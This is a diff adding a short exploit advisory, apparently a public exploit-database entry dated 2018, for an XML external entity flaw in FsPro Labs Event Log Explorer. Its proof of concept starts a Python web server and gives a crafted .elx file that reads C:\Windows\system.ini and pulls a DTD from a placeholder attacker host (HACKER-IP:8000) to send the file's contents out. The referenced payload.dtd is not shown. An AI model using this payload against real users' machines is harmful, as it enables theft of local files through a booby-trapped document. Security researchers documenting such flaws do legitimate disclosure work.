@@ -1,0 +1,23 @@
+# Title: FsPro Labs Event Log Explorer v4.6.1.2115 - XML External Entity Injection
+# Author: hyp3rlinx
+# Date: 2018-09-01
+# Vendor: www.eventlogxp.com
+# Software: https://eventlogxp.com/download.php
+# Affected Component: elex.exe
+# CVE: N/A
+
+# Description:
+# Upon opening a specially crafted .ELX file in Event Log Explorer, remote attackers 
+# can potentially gain access to local files.
+
+# PoC
+python -m SimpleHTTPServer
+ 
+"test.elx"
+
+<?xml version="1.0"?>
+<!DOCTYPE gga [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://HACKER-IP:8000/payload.dtd">
+%dtd;]>
+<infodisclosa>&send;</infodisclosa>
